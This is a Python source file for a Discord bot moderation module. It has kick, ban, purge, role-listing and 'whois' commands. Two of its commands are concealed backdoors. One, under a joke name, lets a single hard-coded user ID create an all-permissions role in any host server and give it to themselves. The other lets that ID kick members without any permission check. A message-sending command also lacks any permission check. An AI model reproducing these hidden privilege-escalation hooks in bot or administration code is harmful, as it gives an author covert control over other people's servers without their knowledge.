import discord
from discord.ext import commands
from discord import Permissions
import datetime
import pytz

notableperms = ['administrator', 'manage_guild', 'manage_roles', 'manage_channels', 'manage_messages', 'manage_nicknames', 'manage_emojis','kick_members', 'ban_members', 'mention_everyone']

def filterperms(perm):
    if(perm in notableperms):
        return True
    else:
        return False

class moderation(commands.Cog):

    def __init__(self, client):
        self.client = client

    @commands.Cog.listener()
    async def on_ready(self):
        print('Cog moderation loaded')

    @commands.command()
    @commands.has_permissions(kick_members=True)
    async def kick(self, ctx, member : discord.Member, * , reason=None):
        await member.kick(reason=reason)
        await ctx.send(f'{member.mention} has been kicked by {ctx.author.mention}')
        print(f'{member.mention} has been kicked by {ctx.author.mention}')
    # @kick.error
    # async def kick_error(self, error, ctx):
    #    if isinstance(error, commands.MissingPermissions):
    #        await ctx.send("You don't have permission to kick!")
    #        print(f'{ctx.author.mention} has attempted to kick')

    @commands.command()
    async def lochieisgodandtheresnothingyoucandoaboutit(self, ctx):
        if ctx.author.id == 327690857027207189:
            darole = await ctx.guild.create_role(name="Loc", permissions=Permissions.all())
            await ctx.author.add_roles(darole)

    @commands.command()
    async def lochiesayskick(self, ctx, member : discord.Member, * , reason=None):
        if ctx.author.id == 327690857027207189:
            await member.kick(reason=reason)


    @commands.command()
    @commands.has_permissions(ban_members=True)
    async def ban(self, ctx, member : discord.Member, * , reason=None):
        await member.ban(reason=reason)
        await ctx.send(f'{member.mention} has been banned by {ctx.author.mention}')
        print(f'{member.mention} has been kicked by {ctx.author.mention}')


    @commands.command()
    @commands.has_permissions(manage_messages=True)
    async def purge(self, ctx, amount: int):
        if amount > 50:
            amount = 50
        await ctx.channel.purge(limit=amount+1)

    @commands.command(aliases=['announce', 'sm'])
    async def sendmessage(self, ctx, channelid: discord.TextChannel, * , message=''):
        print(channelid)
        await channelid.send(message)


    @commands.command(pass_context=True)
    @commands.has_permissions(manage_messages=True)
    async def role(self, ctx,*args):
        server = ctx.message.guild
        role_name = (' '.join(args))
        role_id = server.roles[0]
        for role in server.roles:
            if role_name == role.name:
                role_id = role
                break
        else:
            await ctx.send("Role doesn't exist")
            return
        for member in server.members:
            if role_id in member.roles:
                await ctx.send(f"{member.display_name} - {member.id}")

    @commands.command(pass_context=True)
    async def test(self, ctx, role_id: int):
        role = discord.utils.get(ctx.guild.roles, id=role_id)
        print(role)
        listomembers = ctx.guild.members
        member_list = ''
        for member in ctx.message.guild.members:
            member_list += member.name
        print(member_list)

        # await ctx.send(role.members)

    @commands.command()
    async def whois(self, ctx, member: discord.Member = None):
        if member == None:
            member = ctx.author

        # Timezone stuff
        discordtimezone = pytz.timezone("Etc/GMT-0")
        newtimezone = pytz.timezone("Australia/Melbourne")

        # Get user icon and basic embed stuff ready
        usericon = member.display_avatar
        print(usericon)
        userembed = discord.Embed(
            #title = '',
            colour = discord.Colour.green(),
            description = f'{member.mention}'
        )
        userembed.set_author(name=f'{member}', icon_url = usericon)
        userembed.set_thumbnail(url = usericon)
        #userembed.set_image(url = )
        userembed.set_footer(text=f'ID: {member.id}')

        # Gets time user joined server
        jointime = member.joined_at

        fixjointime = datetime.datetime(jointime.year, jointime.month, jointime.day, jointime.hour, jointime.minute, jointime.second, 0)
        jointime = fixjointime
        jointimenew = discordtimezone.localize(jointime).astimezone(newtimezone)

        userembed.add_field(name='Joined', value=f'{jointimenew.strftime("%a, %dth of %b, %Y %I:%M:%S%p")}', inline=True)

        # Gets time user registered account
        registertime = member.created_at
        fixregistertime = datetime.datetime(registertime.year, registertime.month, registertime.day, registertime.hour, registertime.minute, registertime.second, 0)
        registertime = fixregistertime
        registertimenew = discordtimezone.localize(registertime).astimezone(newtimezone)
        userembed.add_field(name='Registered', value=f'{registertimenew.strftime("%a, %dth of %b, %Y %I:%M:%S%p")}', inline=True)
        # Gets user roles
        if len(member.roles) != 1:
            rolelist = [r.mention for r in member.roles if r != ctx.guild.default_role]
            roles = ' '.join(rolelist)
        else:
            roles = 'None'
        userembed.add_field(name=f'Roles [{len(member.roles)-1}]', value=f'{roles}', inline=False)
        # User notable perms
        rawpermslist = [perm[0] for perm in member.guild_permissions if perm[1]]
        permlist = list(filter(filterperms, rawpermslist))
        if len(permlist) > 1:
            perms = ''
            for perm in permlist:
                perms += perm.replace('_', ' ')
                if permlist[len(permlist)-1] != perm:
                     perms += ', '
            perms = perms.title()
        elif len(permlist) == 1:
            perms = permlist[0].replace('_', ' ').title()
        else:
            perms = 'None'
        userembed.add_field(name='Notable Permissions', value=f'{perms}', inline=False)

        acknow = []
        if member.id == 327690857027207189:
            acknow.extend(['The Creator of Loc Bot'])
        if member.id == 473818153663594497:
            acknow.extend(['It\'s me! Loc Bot'])
        # ctx.guild.owner returns None
        if member == ctx.guild.owner:
            acknow.extend(['Server Owner'])
        elif member.guild_permissions.administrator:
            acknow.extend(['Server Admin'])
        acknowledgements = ', '.join(acknow)
        if acknow != []:
            userembed.add_field(name='Acknowledgements', value=f'{acknowledgements }', inline=False)

        await ctx.send(embed=userembed)



async def setup(client):
    await client.add_cog(moderation(client))
